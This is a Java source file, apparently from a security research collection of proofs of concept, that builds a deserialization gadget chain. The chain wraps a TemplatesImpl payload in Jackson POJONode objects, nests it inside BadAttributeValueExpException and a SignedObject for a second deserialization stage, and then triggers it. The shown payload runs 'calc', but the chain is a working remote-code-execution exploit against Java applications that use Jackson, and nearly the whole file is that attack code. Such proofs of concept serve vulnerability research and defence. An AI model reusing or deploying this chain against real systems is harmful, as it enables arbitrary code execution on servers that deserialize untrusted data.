package com.javasec.pocs.jackson;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.security.*;
public class BASignObjectChain {
    public static void main(String[] args) throws Exception {
        SerializeUtils.OverideJackson();
        Templates templatesImpl = SerializeUtils.getTemplate("calc");
        POJONode jsonNode1 = new POJONode(templatesImpl);
        BadAttributeValueExpException badAttributeValueExpException1 = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException1,"val",jsonNode1);
        SignedObject signObject = SerializeUtils.getSignObject(badAttributeValueExpException1);
        POJONode jsonNode2 = new POJONode(signObject);
        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException2,"val",jsonNode2);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException2));
    }
}
